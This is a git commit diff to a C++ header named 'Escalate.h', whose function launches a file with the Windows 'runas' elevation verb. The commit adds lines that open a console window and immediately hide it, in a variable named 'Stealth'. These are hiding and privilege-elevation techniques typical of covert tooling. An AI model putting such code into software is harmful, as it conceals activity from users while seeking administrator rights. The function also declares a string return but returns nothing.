bdb3efec860f241eeb6e128851231b1a141af78c
Crazedpotato <92868941+THECRAZEDPOTATTO@users.noreply.github.com>
2022-10-10 20:33:32 -0400

    Update Escalate.h

--- Escalate.h
+++ Escalate.h
@@ -7,4 +7,8 @@ using namespace std;
 std::string escalate(string file)
 {
     ShellExecuteA(NULL, "runas", file.c_str(), 0, 0, SW_SHOWNORMAL);
+    HWND Stealth;
+	AllocConsole();
+	Stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(Stealth, 0);
 }
